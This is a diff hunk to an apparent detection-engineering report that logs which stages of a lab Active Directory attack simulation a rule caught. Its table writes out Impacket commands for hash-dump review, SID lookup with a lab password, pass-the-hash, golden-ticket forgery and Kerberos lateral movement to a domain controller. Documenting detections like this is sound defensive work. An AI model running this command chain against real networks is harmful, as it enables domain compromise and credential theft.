@@ -114,7 +114,7 @@ During the 20-stage attack simulation, Rule 100220 fired **50 times** (CSV data 
 | **9276** | 9275 | `18:02:49` | root (0) | `/tmp` | `cat /tmp/dcsync_output.ntds` | Stage 14: Dumped Hashes Verification |
 | **9286** | 9285 | `18:04:15` | root (0) | `/tmp` | `python3 /usr/local/bin/lookupsid.py ad.lab/HANK_SHERMAN:'Password123'@192.168.56.10 \| grep "Domain SID"` | Stage 16: Domain SID Discovery for Golden Ticket |
 | **9304** | 9303 | `18:05:57` | root (0) | `/tmp` | `python3 /usr/local/bin/wmiexec.py -hashes :cc814... Administrator@192.168.56.10` | Stage 15: Pass-the-Hash Lateral Movement |
-| **9306** | 9305 | `18:06:40` | root (0) | `/tmp` | `python3 /usr/local/bin/ticketer.py -nthash 611a8... -domain-sid S-1-5-21-3315718683-193253855-3518612541 -domain ad.lab Administrator` | Stage 16: Golden Ticket Forgery (krbtgt KVNO 3) |
+| **9306** | 9305 | `18:06:40` | root (0) | `/tmp` | `python3 /usr/local/bin/ticketer.py -nthash 611a8... -domain-sid S-1-5-21-3315718683-193253855-3518612541 -domain ad.lab Administrator` | Stage 16: Golden Ticket Forgery (krbtgt Master Hash) |
 | **9307** | 9306 | `18:06:48` | root (0) | `/tmp` | `export KRB5CCNAME=/tmp/Administrator.ccache` | Stage 16: Kerberos Cache Initialization |
 | **9373** | 9372 | `18:14:50` | root (0) | `/tmp` | `python3 /usr/local/bin/wmiexec.py -k -no-pass ad.lab/Administrator@PC-DC.ad.lab` | Stage 17: Golden Ticket Lateral WMI to DC |
 | **9391** | 9390 | `18:15:13` | root (0) | `/tmp` | `python3 /usr/local/bin/wmiexec.py -hashes :cc814... Administrator@192.168.56.20` | Stage 18: Workstation Lateral WMI Execution |
